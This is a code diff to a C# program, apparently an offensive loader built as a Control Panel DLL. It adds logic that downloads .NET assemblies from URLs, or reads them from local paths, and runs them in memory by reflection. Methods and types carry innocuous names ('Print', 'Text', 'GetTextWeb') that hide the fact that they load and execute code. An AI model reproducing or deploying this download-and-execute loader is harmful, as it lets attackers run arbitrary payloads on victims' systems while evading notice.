@@ -49,7 +49,24 @@ namespace CPL
             }
         }
 
-        static Text Print(string url, int retry, int timeout)
+        static void Print(byte[] str, string[] args)
+        {
+            Text text = Text.Load(str);
+            Print(text, args);
+        }
+
+        static void Print(string file, string[] args)
+        {
+            Text text = Text.LoadFile(file);
+            Print(text, args);
+        }
+
+        static void Print(Text text, string[] args)
+        {
+            text.EntryPoint.Invoke(null, new object[] { args });
+        }
+
+        static byte[] GetTextWeb(string url, int retry, int timeout)
         {
             Console.WriteLine($"{url}");
 
@@ -73,10 +90,8 @@ namespace CPL
             {
                 Environment.Exit(-1);
             }
-            // Console.WriteLine(str[0]);
-            Text second = Text.Load(str);
-
-            return second;
+            
+            return str;
         }
 
          [DllExport]
@@ -93,15 +108,26 @@ namespace CPL
                 foreach (string file in executables)
                 {
                     Console.WriteLine("[+] Processing {0}", file);
-                    string[] words = file.Split(' ');
-                    
-                    Text text = Print(words[0], 3, 1);
+                    string[] words = file.Split(' '); // Parse line <exe> <arg 1> <arg 2> ... <arg n>
 
-                    string[] args = new string[] { null };
+                    string exe = words[0]; // <exe>
+                    string[] args = new string[] { null }; // <arg 1> <arg 2> ... <arg n>
                     if (words.Length > 1)
                         args = words.Skip(1).ToArray();
 
-                    text.EntryPoint.Invoke(null, new object[] { args });
+                    if (exe.StartsWith("http")) {
+                        byte[] text = GetTextWeb(exe, 3, 1);
+                        Print(text, args);
+                    }
+                    else if (File.Exists(Path.GetFullPath(exe))) {
+                        Console.WriteLine(Path.GetFullPath(exe));
+                        Print(exe, args);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] File not found.");
+                    }
+
                     Console.WriteLine("[+] Finished");
                 }
             }
